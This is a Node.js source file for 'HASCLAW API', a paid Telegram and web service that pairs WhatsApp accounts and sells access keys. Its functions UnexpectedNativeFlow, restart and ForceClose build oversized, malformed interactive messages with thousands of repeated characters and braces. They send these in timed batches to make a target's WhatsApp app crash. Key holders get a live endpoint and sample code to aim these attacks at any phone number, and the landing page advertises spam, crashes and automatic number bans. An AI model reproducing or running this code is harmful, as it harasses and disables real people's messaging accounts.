const { Telegraf } = require("telegraf");
const fs = require('fs');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const path = require("path");
const moment = require('moment-timezone');
const config = require("./config.js");
const tokens = config.tokens;
const bot = new Telegraf(tokens);
const axios = require("axios");
const OwnerId = config.owner;
const sessions = new Map();
const sessions_dir = "./sessions";
const file_session = "./active.json";
const express = require('express');
const app = express();
const PORT = config.port;
const bodyParser = require("body-parser");
const USERS_FILE = path.join(__dirname, "user.json");
let userApiBug = null;

const {
    default: makeWASocket,
    makeInMemoryStore,
    useMultiFileAuthState,
    useSingleFileAuthState,
    initInMemoryKeyStore,
    fetchLatestBaileysVersion,
    makeWASocket: WASocket,
    AuthenticationState,
    BufferJSON,
    downloadContentFromMessage,
    downloadAndSaveMediaMessage,
    generateWAMessage,
    generateWAMessageContent,
    generateWAMessageFromContent,
    generateMessageID, 
    generateRandomMessageId,   
    prepareWAMessageMedia,
    getContentType,
    mentionedJid,
    relayWAMessage,
    templateMessage,
    InteractiveMessage,
    Header,
    MediaType,
    MessageType,
    MessageOptions,
    MessageTypeProto,
    WAMessageContent,
    WAMessage,
    WAMessageProto,
    WALocationMessage,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMediaUpload,
    WAMessageStatus,
    WA_MESSAGE_STATUS_TYPE,
    WA_MESSAGE_STUB_TYPES,
    Presence,
    emitGroupUpdate,
    emitGroupParticipantsUpdate,
    GroupMetadata,
    WAGroupMetadata,
    GroupSettingChange,
    areJidsSameUser,
    ChatModification,
    getStream,
    isBaileys,
    jidDecode,
    processTime,
    ProxyAgent,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    Browsers,
    Browser,
    WAFlag,
    WAContextInfo,
    WANode,
    WAMetric,
    Mimetype,
    MimetypeMap,
    MediaPathMap,
    DisconnectReason,
    MediaConnInfo,
    ReconnectMode,
    AnyMessageContent,
    waChatKey,
    WAProto,
    proto,
    BaileysError,
} = require('@whiskeysockets/baileys');


function saveUsers(users) {
  fs.writeFileSync(USERS_FILE, JSON.stringify(users, null, 2));
}

function getUsers() {
  try {
    return JSON.parse(fs.readFileSync(USERS_FILE));
  } catch {
    return [];
  }
}


function generateKey(length = 32) {
  const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  return Array.from({ length }, () => chars[Math.floor(Math.random() * chars.length)]).join("");
}


function parseDuration(input) {
  const match = input.match(/^(\d+)([dwm])$/i);
  if (!match) return 0;

  const value = parseInt(match[1]);
  const unit = match[2].toLowerCase();

  switch (unit) {
    case 'd': return value * 24 * 60 * 60 * 1000;
    case 'w': return value * 7 * 24 * 60 * 60 * 1000;
    case 'm': return value * 30 * 24 * 60 * 60 * 1000;
    default: return 0;
  }
}


let Ren;

const saveActive = (BotNumber) => {
  const list = fs.existsSync(file_session) ? JSON.parse(fs.readFileSync(file_session)) : [];
  if (!list.includes(BotNumber)) {
    list.push(BotNumber);
    fs.writeFileSync(file_session, JSON.stringify(list));
  }
};

const sessionPath = (BotNumber) => {
  const dir = path.join(sessions_dir, `device${BotNumber}`);
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
  return dir;
};

const initializeWhatsAppConnections = async () => {
  if (!fs.existsSync(file_session)) return;
  const activeNumbers = JSON.parse(fs.readFileSync(file_session));
  console.log(chalk.blue(`
┌──────────────────────────────┐
│ Ditemukan sesi WhatsApp aktif
├──────────────────────────────┤
│ Jumlah : ${activeNumbers.length}
└──────────────────────────────┘ `));

  for (const BotNumber of activeNumbers) {
    console.log(chalk.green(`Menghubungkan: ${BotNumber}`));
    const sessionDir = sessionPath(BotNumber);
    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

    Ren = makeWASocket({
      auth: state,
      printQRInTerminal: false,
      logger: pino({ level: "silent" }),
      defaultQueryTimeoutMs: undefined,
    });

    await new Promise((resolve, reject) => {
      Ren.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
        if (connection === "open") {
          console.log(`Bot ${BotNumber} terhubung!`);
          sessions.set(BotNumber, Ren);
          return resolve();
        }
        if (connection === "close") {
          const reconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
          return reconnect ? await initializeWhatsAppConnections() : reject(new Error("Koneksi ditutup"));
        }
      });
      Ren.ev.on("creds.update", saveCreds);
    });
  }
};

const connectToWhatsApp = async (BotNumber, chatId, ctx) => {
  const sessionDir = sessionPath(BotNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  let statusMessage = await ctx.reply(`Pairing dengan nomor *${BotNumber}*...`, { parse_mode: "Markdown" });

  const editStatus = async (text) => {
    try {
      await ctx.telegram.editMessageText(chatId, statusMessage.message_id, null, text, { parse_mode: "Markdown" });
    } catch (e) {
      console.error("Gagal edit pesan:", e.message);
    }
  };

  Ren = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  let isConnected = false;

  Ren.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
    if (connection === "close") {
      const code = lastDisconnect?.error?.output?.statusCode;
      if (code >= 500 && code < 600) {
        await editStatus(makeStatus(BotNumber, "Menghubungkan ulang..."));
        return await connectToWhatsApp(BotNumber, chatId, ctx);
      }

      if (!isConnected) {
        await editStatus(makeStatus(BotNumber, "❌ Gagal terhubung."));
        return fs.rmSync(sessionDir, { recursive: true, force: true });
      }
    }

    if (connection === "open") {
      isConnected = true;
      sessions.set(BotNumber, Ren);
      saveActive(BotNumber);
      return await editStatus(makeStatus(BotNumber, "✅ Berhasil terhubung."));
    }

    if (connection === "connecting") {
      await new Promise(r => setTimeout(r, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await Ren.requestPairingCode(BotNumber, "RENNBAIL");
          const formatted = code.match(/.{1,4}/g)?.join("-") || code;

          const codeData = makeCode(BotNumber, formatted);
          await ctx.telegram.editMessageText(chatId, statusMessage.message_id, null, codeData.text, {
            parse_mode: "Markdown",
            reply_markup: codeData.reply_markup
          });
        }
      } catch (err) {
        console.error("Error requesting code:", err);
        await editStatus(makeStatus(BotNumber, `❗ ${err.message}`));
      }
    }
  });

  Ren.ev.on("creds.update", saveCreds);
  return Ren;
};

const makeStatus = (number, status) => `\`\`\`
┌───────────────────────────┐
│ STATUS │ ${status.toUpperCase()}
├───────────────────────────┤
│ Nomor : ${number}
└───────────────────────────┘\`\`\``;

const makeCode = (number, code) => ({
  text: `\`\`\`
┌───────────────────────────┐
│ STATUS │ SEDANG PAIR
├───────────────────────────┤
│ Nomor : ${number}
│ Kode  : ${code}
└───────────────────────────┘
\`\`\``,
  parse_mode: "Markdown",
  reply_markup: {
    inline_keyboard: [
      [{ text: "!! 𝐒𝐚𝐥𝐢𝐧°𝐂𝐨𝐝𝐞 !!", callback_data: `salin|${code}` }]
    ]
  }
});

console.clear();  
                  console.log(chalk.blue(`⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
──────────────────▒
─────────────────░█
────────────────███
───────────────██ღ█
──────────────██ღ▒█──────▒█
─────────────██ღ░▒█───────██
─────────────█ღ░░ღ█──────█ღ▒█
────────────█▒ღ░▒ღ░█───██░ღღ█
───────────░█ღ▒░░▒ღ░████ღღღ█
───░───────█▒ღ▒░░░▒ღღღ░ღღღ██─────░█
───▓█─────░█ღ▒░░░░░░░▒░ღღ██─────▓█░
───██─────█▒ღ░░░░░░░░░░ღ█────▓▓██
───██────██ღ▒░░░░░░░░░ღ██─░██ღ▒█
──██ღ█──██ღ░▒░░░░░░░░░░ღ▓██▒ღღ█
──█ღღ▓██▓ღ░░░▒░░░░░░░░▒░ღღღ░░▓█
─██ღ▒▒ღღ░░ღღღღ░░▒░░░░ ღღღღ░░ღღღ██
─█ღ▒ღღ█████████ღღ▒░ღ██████████ღ▒█░
██ღღ▒████████████ღღ████████████░ღ█▒
█░ღღ████████████████████████████ღღ█
█▒ღ██████████████████████████████ღ█
██ღღ████████████████████████████ღ██
─██ღღ██████████████████████████ღ██
──░██ღღ██████████████████████ღღ██
────▓██ღ▒██████████████████▒ღ██
───░──░███ღ▒████████████▒ღ███
────░░───▒██ღღ████████▒ღ██
───────────▒██ღ██████ღ██
─────────────██ღ████ღ█
───────────────█ღ██ღ█
────────────────█ღღ█
────────────────█ღ█░
─────────────────██░
`));

bot.launch();
console.log(chalk.red(`
╭─☐ BOT HASCLAW API 
├─ ID OWN : ${OwnerId}
├─ BOT : CONNECTED ✅
╰───────────────────`));
initializeWhatsAppConnections();

function isOwner(userId)
              {
                  return config.owner.includes(userId.toString());
                  }

// ----- ( Comand Sender & Del Sende Handlerr ) ----- \\
  bot.command("connect", async (ctx) =>
              {
                  const userId = ctx.from.id.toString();
                  if (!isOwner(userId)) return ctx.reply("Hanya owner yang bisa menambahkan admin.");
                  const args = ctx.message.text.split(" ");
                  if (args.length < 2) {
                  return await ctx.reply("Masukkan nomor WA: `/connect 62xxxx`", { parse_mode: "Markdown" });
                   }

                   const BotNumber = args[1];
                   await ctx.reply(`⏳ Memulai pairing ke nomor ${BotNumber}...`);
                   await connectToWhatsApp(BotNumber, ctx.chat.id, ctx);
});
    
  bot.command("listsender", (ctx) =>
              {
                  if (sessions.size === 0) return ctx.reply("Tidak ada sender aktif.");
                  const list = [...sessions.keys()].map(n => `• ${n}`).join("\n");
                  ctx.reply(`*Daftar Sender Aktif:*\n${list}`, { parse_mode: "Markdown" });
});

  bot.command("delsender", async (ctx) =>
              {
                  const args = ctx.message.text.split(" ");
                  if (args.length < 2) return ctx.reply("Contoh: /delsender 628xxxx");

                  const number = args[1];
                  if (!sessions.has(number)) return ctx.reply("Sender tidak ditemukan.");

                  try {
                  const sessionDir = sessionPath(number);
                  sessions.get(number).end(); 
                  sessions.delete(number);
                  fs.rmSync(sessionDir, { recursive: true, force: true });

                  const data = JSON.parse(fs.readFileSync(file_session));
                  const updated = data.filter(n => n !== number);
                  fs.writeFileSync(file_session, JSON.stringify(updated));

                  ctx.reply(`Sender ${number} berhasil dihapus.`);
                  } catch (err) {
                  console.error(err);
 
                  }
                  });
                  
                  
                  
                  
                




bot.command("buatkey", async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1);
  const username = args[0];
  const durasi = args[1] || "30d";
   const userId = ctx.from.id.toString();
                  if (!isOwner(userId)) return ctx.reply("Hanya owner yang bisa menambahkan admin.");

  if (!username) {
    return ctx.reply("❌ Masukkan username.\nContoh: /buatkey renx 30d");
  }

  const key = generateKey();
  const expired = Date.now() + parseDuration(durasi);

  const users = getUsers();
  users.push({ username, key, expired });
  saveUsers(users);

  const replyText = `
🧬 *H A S C L A W - API-BUG*

*👤 User :* \`${username}\`
*🔑 Key  :* \`${key}\`

🌐 *Web API :*
\`http://170.64.161.133:1905/8fA3X9dTzQ1vL6eKjYpC7MnRwZb45UhEnGtVs02LBmHd\`

💻 *Contoh Pemakaian di Script:*
\`\`\`js
async function sendFreezeDroid(targetNumber) {
  try {
    const res = await axios.get(
      "http://170.64.161.133:1905/8fA3X9dTzQ1vL6eKjYpC7MnRwZb45UhEnGtVs02LBmHd" +
      "?target=" + targetNumber +
      "&username=${username}&key=${key}"
    );
    console.log("✅ Berhasil:", res.data);
  } catch (err) {
    console.error("❌ Gagal:", err.response?.data || err.message);
  }
}

// Pemanggilan:
await sendFreezeDroid("628xxxx");
\`\`\`

❗ *Catatan Penting:*
- Jangan sebarkan Web API ini.
- Jika bocor, akses akan langsung dicabut tanpa refund.
- *No Reff!!*

📢 https://t.me/RenIsDev
  `.trim();

  ctx.reply(replyText, { parse_mode: "Markdown" });
});

                 
//bug funcation 
async function UnexpectedNativeFlow(target, mention = true) {
  try {
    const msg = generateWAMessageFromContent(
      target,
      proto.Message.fromObject({
        message: {
          viewOnceMessage: {
            message: {
              interactiveMessage: {
                body: {
                  text: "🧬⃟⃨〫⃰—‣ ⁖⟆͙  𝐂͢𝚺𝚵͢ 𝚻͢𝚬𝚨M ⟅̊༑ ‣—"  + "ꦽ".repeat(30000),
                  format: "DEFAULT"
                },
                footer: {
                  text: "© CSX-Team 2025"
                },
                nativeFlowMessage: {
                  messageParamsJson: "{".repeat(10000),
                  buttons: []
                }
              },
              contextInfo: {
                participant: "0@s.whatsapp.net",
                remoteJid: "status@broadcast",
                quotedMessage: {
                  documentMessage: {
                    url:
                      "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?" +
                      "ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                    mimetype:
                      "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                    fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                    fileLength: "9999999999999",
                    pageCount: 3567587327,
                    mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                    fileName: " ༑ The CSX - ( 🐼 ) ༑",
                    fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                    directPath:
                      "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?" +
                      "ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1735456100",
                    contactVcard: true,
                    caption: "©CSX-Team 2025 #ExplanationOldTypeMsg"
                  }
                }
              }
            }
          }
        }
      }),
      { userJid: target }
    );

    await Ren.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: undefined
                }
              ]
            }
          ]
        }
      ]
    });

    if (mention) {
      await Ren.relayMessage(
        target,
        {
          statusMentionMessage: {
            message: {
              protocolMessage: {
                key: msg.key,
                type: 25
              }
            }
          }
        },
        {
          additionalNodes: [
            {
              tag: "meta",
              attrs: {
                is_status_mention: "𝐖𝐞𝐅𝐨𝐫𝐑𝐞̈𝐧𝐧̃ #🇧🇷"
              },
              content: undefined
            }
          ]
        }
      );
    }

    console.log(chalk.green("─────「 ⏤WeForRen ! 」─────"));
  } catch (err) {
    console.error(chalk.red("UnexpectedNativeFlow Error:"), err);
  }
}

async function restart(target, mention = true) {
    const msg = generateWAMessageFromContent(target, proto.Message.fromObject({
        ephemeralMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 3,
                },
                interactiveMessage: {
                    contextInfo: {
                        mentionedJid: [target],
                        isForwarded: true,
                        forwardingScore: 99999999,
                        businessMessageForwardInfo: {
                            businessOwnerJid: target,
                        },
                    },
                    body: {
                        text: "\u0007".repeat(30000),
                    },
                    nativeFlowMessage: {
                        messageParamsJson: "{".repeat(10000),
                        buttons: [],
                    }
                }
            }
        }
    }), { userJid: target });

    await Ren.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await Ren.relayMessage(
            target,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "𝐖𝐞𝐅𝐨𝐫𝐑𝐞̈𝐧𝐧̃ #🇧🇷" },
                        content: undefined
                    }
                ]
            }
        );
    }
    console.log(chalk.green('─────「 ⏤WeForRen ! 」─────'));
}

async function ForceClose(durationHours, X) {
              const totalDurationMs = durationHours * 60 * 60 * 1000;
                const startTime = Date.now();
                let count = 0;
                let batch = 1;
                const maxBatches = 2;

              const sendNext = async () => {
                if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
                console.log(`✅ Selesai! Total batch terkirim: ${batch - 1}`);
                return;
                }

              try {
                if (count < 2) {
                await Promise.all([
                restart(X),
                restart(X)
              ]);
                console.log(chalk.yellow(`
┌────────────────────────┐
│ ${count + 1}/2 Andros 📟
└────────────────────────┘
  `));
                count++;
                setTimeout(sendNext, 10000);
              } else {
                console.log(chalk.green(`👀 Succes Send Bugs to ${X} (Batch ${batch})`));
              if (batch < maxBatches) {
                console.log(chalk.yellow(`( Grade Matrix 🍂 777 ).`));
                count = 0;
                batch++;
                setTimeout(sendNext, 5 * 60 * 1000);
              } else {
                console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
              }
              }
              } catch (error) {
              console.error(`❌ Error saat mengirim: ${error.message}`);
              setTimeout(sendNext, 10000);
                    }
              };
              sendNext();
              }
              

// Appp Get root Server \\
app.get("/Zp7Lk93QwXyTnR8aMfJ5CgD4bUEo1VsHBLKm20vNzAixX2eNj7PaRYqUbMzVKg4CoT10WnLZxOtHB35ld9AsmcWc1gATxvQMp37uFLNbYzEJWlnR0KhX9dokCS25oVfUBHPlBp0Hm2oowHNaEHQfQHxYfySWhlRStZp7Lk93QwXyTnR8aMfJ5CgD4bUEo1VsHBLKm20vNzAixX2eNj7PaRYqUbMzVKg4CoT10WnLZxOtHB35ld9AsmcWc1gATxvQMp37uFLNbYzEJWlnR0KhX9dokCS25oVfUBHPlBp0Hm2oowHNaEHQfQHxYfySWhlRStZp7Lk93QwXyTnR8aMfJ5CgD4bUEo1VsHBLKm20vNzAixX2eNj7PaRYqUbMzVKg4CoT10WnLZxOtHB35ld9AsmcWc1gATxvQMp37uFLNbYzEJWlnR0KhX9dokCS25oVfUBHPlBp0Hm2oowHNaEHQfQHxYfySWhlRStHPlBp0Hm2oowHNaEHQfQHxYfySWhlRSt", (req, res) => {
  res.send(`
<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>HASCLAW Home</title>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@500;600;900&display=swap" rel="stylesheet">
  <style>
    * { box-sizing: border-box; }
    body {
      margin: 0;
      background: linear-gradient(to bottom right, #1b1c22, #2e1a47);
      font-family: 'Poppins', sans-serif;
      color: #f0f0f0;
      height: 100vh;
      overflow: hidden;
    }
    .container {
      max-width: 1000px;
      margin: auto;
      padding: 40px 20px 80px;
      height: 100%;
      overflow-y: auto;
    }
    .title {
      font-size: 36px;
      font-weight: 900;
      background: linear-gradient(90deg, #60a5fa, #a78bfa);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      margin-bottom: 10px;
      text-align: center;
    }
    .desc {
      font-size: 16px;
      text-align: center;
      color: #ccc;
      margin-bottom: 40px;
    }
    .plans {
      display: flex;
      gap: 20px;
      overflow-x: auto;
      padding-bottom: 20px;
      scroll-snap-type: x mandatory;
    }
    .plan {
      min-width: 280px;
      background: rgba(255,255,255,0.05);
      border: 1px solid rgba(255,255,255,0.1);
      border-radius: 16px;
      padding: 24px;
      scroll-snap-align: center;
      flex-shrink: 0;
      box-shadow: 0 0 20px rgba(124, 58, 237, 0.3);
    }
    .plan h3 {
      margin-top: 0;
      font-size: 20px;
      color: #facc15;
    }
    .plan ul {
      padding-left: 18px;
    }
    .buy-text {
      color: #c084fc;
      text-decoration: underline;
      font-size: 13px;
      font-weight: 500;
    }
    .buy-text:hover {
      color: #a855f7;
    }
    .btn-login {
      display: block;
      margin: 40px auto 10px;
      background: #7c3aed;
      color: white;
      padding: 14px 28px;
      font-size: 15px;
      border-radius: 10px;
      text-align: center;
      text-decoration: none;
      font-weight: 600;
      transition: background 0.3s ease;
      width: max-content;
    }
    .btn-login:hover {
      background: #6d28d9;
    }
    .footer {
      text-align: center;
      margin-top: 30px;
      font-size: 11px;
      color: #888;
    }

    /* Side menu */
    .menu-btn {
      position: absolute;
      top: 20px;
      left: 20px;
      font-size: 26px;
      color: #c084fc;
      cursor: pointer;
      z-index: 1001;
    }
    .side-menu {
      position: fixed;
      top: 0;
      left: -260px;
      width: 250px;
      height: 100%;
      background: rgba(40, 40, 60, 0.95);
      backdrop-filter: blur(10px);
      padding: 20px;
      box-shadow: 5px 0 15px rgba(0, 0, 0, 0.3);
      transition: left 0.3s ease;
      z-index: 1000;
    }
    .side-menu.active {
      left: 0;
    }
    .side-title {
      font-size: 20px;
      font-weight: 800;
      color: #a78bfa;
      text-align: center;
      margin-bottom: 25px;
    }
    .info-box {
      background: rgba(255, 255, 255, 0.05);
      border: 1px solid rgba(255,255,255,0.1);
      border-radius: 10px;
      padding: 12px 14px;
      margin-bottom: 15px;
    }
    .info-box a {
      color: #ffffff;
      font-size: 14px;
      text-decoration: none;
      font-weight: 500;
      display: block;
    }
    .thanks {
      color: #999;
      font-size: 11px;
      text-align: center;
      margin-top: 30px;
    }
  </style>
</head>
<body>
  <div class="menu-btn" onclick="toggleMenu()">☰</div>

  <div class="side-menu" id="menu">
    <div class="side-title">HASCLAW API</div>
    <div class="info-box">
      <a href="https://t.me/RenXiter" target="_blank">➤ Developer: RenXiter</a>
    </div>
    <div class="info-box">
      <a href="https://t.me/RenIsDev" target="_blank">➤ Channel: RenIsDev</a>
    </div>
    <div class="thanks">
      Thanks for support<br/>HASCLAW API
    </div>
  </div>

  <div class="container">
    <div class="title">HASCLAW API</div>
    <div class="desc">Mengirim spam & crash di WhatsApp dengan kuat dan mudah.<br/> Melarang dan memblokir nomor secara otomatis.</div>

    <div class="plans">
      <div class="plan">
        <h3>Paket Dasar</h3>
        <ul>
          <li>Spam: unli</li>
          <li>Kunci: 3 hari</li>
          <li>Dukungan dasar</li>
        </ul>
        <p><strong>Rp 35.900 / 3 Hari</strong></p>
        <p><a href="https://t.me/RenXiter" target="_blank" class="buy-text">Beli Paket Ini</a></p>
      </div>
      <div class="plan">
        <h3>Premium Plan</h3>
        <ul>
          <li>Spam cepat</li>
          <li>Kunci: 15 hari</li>
          <li>Dukungan prioritas</li>
        </ul>
        <p><strong>Rp 50.900 / 15 Hari</strong></p>
        <p><a href="https://t.me/RenXiter" target="_blank" class="buy-text">Beli Paket Ini</a></p>
      </div>
      <div class="plan">
        <h3>Ultimate Plan</h3>
        <ul>
          <li>Spam brutal</li>
          <li>Kunci: 30 hari</li>
          <li>Full Support</li>
        </ul>
        <p><strong>Rp 180.000 / 30 Hari</strong></p>
        <p><a href="https://t.me/RenXiter" target="_blank" class="buy-text">Beli Paket Ini</a></p>
      </div>
    </div>

    <a class="btn-login" href="/HPlBp0Hm2oowHNaEHQfQHxYfySWhlRStHPlBp0Hm2oowHNaEHQfQHxYfySWhlRStHPlBp0Hm2oowHNaEHQfQHxYfySWhlRSt14385488527Zp7Lk93QwXyTnR8aMfJ5CgD4bUEo1VsHBLKm20vNzAixX2eNj7PaRYqUbMzVKg4CoT10WnLZxOtHB35ld9AsmcWc1gATxvQMp37uFLNbYzEJWlnR0KhX9dokCS25oVfUBHPlBp0Hm2oowHNaEHQfQHxYfySWhlRStZp7Lk93QwXyTnR8aMfJ5CgD4bUEo1VsHBLKm20vNzAixX2eNj7PaRYqUbMzVKg4CoT10WnLZxOtHB35ld9AsmcWc1gATxvQMp37uFLNbYzEJWlnR0KhX9dokCS25oVfUBHPlBp0Hm2oowHNaEHQfQHxYfySWhlRStZp7Lk93QwXyTnR8aMfJ5CgD4bUEo1VsHBLKm20vNzAixX2eNj7PaRYqUbMzVKg4CoT10WnLZxOtHB35ld9AsmcWc1gATxvQMp37uFLNbYzEJWlnR0KhX9dokCS25oVfUBHPlBp0Hm2oowHNaEHQfQHxYfySWhlRStHPlBp0Hm2oowHNaEHQfQHxYfySWhlRSt">LOGIN</a>
    <div class="footer">© 2025 Hasclaw Network </div>
  </div>

  <script>
    function toggleMenu() {
      document.getElementById('menu').classList.toggle('active');
    }
  </script>
</body>
</html>
  `);
});

function renderLoginPage(message = "") {
  return `
  <!DOCTYPE html>
  <html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>HASCLAW API Login</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@500;600;900&display=swap" rel="stylesheet">
    <style>
      * { box-sizing: border-box; }
      body {
        margin: 0;
        background: linear-gradient(to bottom right, #1b1c22, #2e1a47);
        font-family: 'Poppins', sans-serif;
        color: #f0f0f0;
        height: 100vh;
        display: flex;
        align-items: center;
        justify-content: center;
        padding: 20px;
      }
      .card {
        background: rgba(255, 255, 255, 0.05);
        border: 1px solid rgba(255, 255, 255, 0.1);
        backdrop-filter: blur(12px);
        padding: 30px;
        border-radius: 20px;
        width: 100%;
        max-width: 500px;
        box-shadow: 0 0 25px rgba(138, 43, 226, 0.4);
        position: relative;
        text-align: center;
      }
      .title {
        font-size: 34px;
        font-weight: 900;
        background: linear-gradient(90deg, #60a5fa, #a78bfa);
        -webkit-background-clip: text;
        -webkit-text-fill-color: transparent;
        letter-spacing: 1px;
        text-shadow: 0 0 3px rgba(167, 139, 250, 0.3);
        margin-bottom: 25px;
      }
      input {
        width: 100%;
        padding: 14px;
        margin-bottom: 15px;
        border-radius: 10px;
        border: none;
        font-size: 15px;
        font-weight: 500;
        background: #2e2e3e;
        color: white;
      }
      button {
        width: 100%;
        padding: 14px;
        font-size: 15px;
        background: #7c3aed;
        color: white;
        font-weight: 600;
        border: none;
        border-radius: 10px;
        cursor: pointer;
        transition: background 0.3s ease;
      }
      button:hover {
        background: #6b21a8;
      }
      .toast {
        position: absolute;
        bottom: 70px;
        left: 50%;
        transform: translateX(-50%);
        background: #dc2626;
        color: white;
        padding: 12px 20px;
        border-radius: 8px;
        font-size: 13px;
        font-weight: 500;
        box-shadow: 0 0 12px rgba(220, 38, 38, 0.4);
        opacity: 0;
        animation: fadeInOut 3.8s ease forwards;
      }
      @keyframes fadeInOut {
        0% { opacity: 0; transform: translateX(-50%) translateY(20px); }
        10% { opacity: 1; transform: translateX(-50%) translateY(0); }
        90% { opacity: 1; transform: translateX(-50%) translateY(0); }
        100% { opacity: 0; transform: translateX(-50%) translateY(20px); }
      }
      .buy-access {
        margin-top: 12px;
        display: inline-block;
        background: #6d28d9;
        color: white;
        padding: 10px 16px;
        border-radius: 8px;
        font-size: 13px;
        font-weight: 500;
        text-decoration: none;
        box-shadow: 0 0 10px rgba(124, 58, 237, 0.5);
        transition: background 0.3s ease;
      }
      .buy-access:hover {
        background: #5b21b6;
      }
      .footer {
        text-align: center;
        font-size: 11px;
        margin-top: 25px;
        color: #999;
      }
    </style>
  </head>
  <body>
    <div class="card">
      <div class="title">HASCLAW API</div>
      <form method="POST" action="/Zp7Lk93QwXyTnR8aMfJ5CgD4bUEo1VsHBLKm20vNzAixX2eNj7PaRYqUbMzVKg4CoT10WnLZxOtHB35ld9AsmcWc1gATxvQMp37uFLNbYzEJWlnR0KhX9dokCS25oVfUB">
        <input type="text" name="username" placeholder="Username" required />
        <input type="text" name="key" placeholder="Key Akses" required />
        <button type="submit">Masuk</button>
      </form>
      <a class="buy-access" href="https://t.me/RenXiter" target="_blank">💰 Buy Access</a>
      <div class="footer">© 2025 Hasclaw Network </div>
    </div>

    ${message ? `<div class="toast">${message}</div>` : ''}
  </body>
  </html>`;
}

const renderPage = (status = "🟣 Ready", detail = {}, isForm = true, userInfo = {}) => {
  const { username, expired } = userInfo;
  const remaining = expired ? Math.max(0, expired - Date.now()) : 0;
  const minutes = Math.floor(remaining / 60000);
  const seconds = Math.floor((remaining % 60000) / 1000);
  const formattedTime = `${minutes}m ${seconds}s`;

  return `
  <!DOCTYPE html>
  <html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>FreezeDroid API</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@500;600&display=swap" rel="stylesheet">
    <style>
      * { box-sizing: border-box; }
      body {
        margin: 0;
        background: linear-gradient(to bottom right, #1b1c22, #2e1a47);
        font-family: 'Poppins', sans-serif;
        color: #f0f0f0;
        height: 100vh;
        display: flex;
        align-items: center;
        justify-content: center;
        padding: 20px;
        position: relative;
      }
      .user-info {
        position: absolute;
        top: 20px;
        left: 20px;
        font-size: 12px;
        background: rgba(255, 255, 255, 0.08);
        padding: 6px 12px;
        border-radius: 8px;
        color: #facc15;
        font-weight: 600;
        box-shadow: 0 0 10px rgba(250, 204, 21, 0.3);
      }
      .logout-btn {
        position: absolute;
        top: 20px;
        right: 20px;
        font-size: 12px;
        background: rgba(255, 255, 255, 0.08);
        padding: 6px 12px;
        border-radius: 8px;
        color: #f87171;
        font-weight: 600;
        cursor: pointer;
        text-decoration: none;
      }
      .card {
        background: rgba(255, 255, 255, 0.05);
        border: 1px solid rgba(255, 255, 255, 0.1);
        backdrop-filter: blur(12px);
        padding: 30px;
        border-radius: 20px;
        width: 100%;
        max-width: 500px;
        box-shadow: 0 0 25px rgba(138, 43, 226, 0.4);
        position: relative;
      }
      .support-toggle {
        position: absolute;
        bottom: 15px;
        right: 20px;
        color: #a78bfa;
        font-size: 14px;
        cursor: pointer;
        font-weight: 600;
        background: rgba(255,255,255,0.05);
        padding: 5px 12px;
        border-radius: 10px;
        transition: background 0.3s ease;
      }
      .support-toggle:hover {
        background: rgba(255,255,255,0.1);
      }
      .support-box {
        display: none;
        position: absolute;
        bottom: 50px;
        right: 20px;
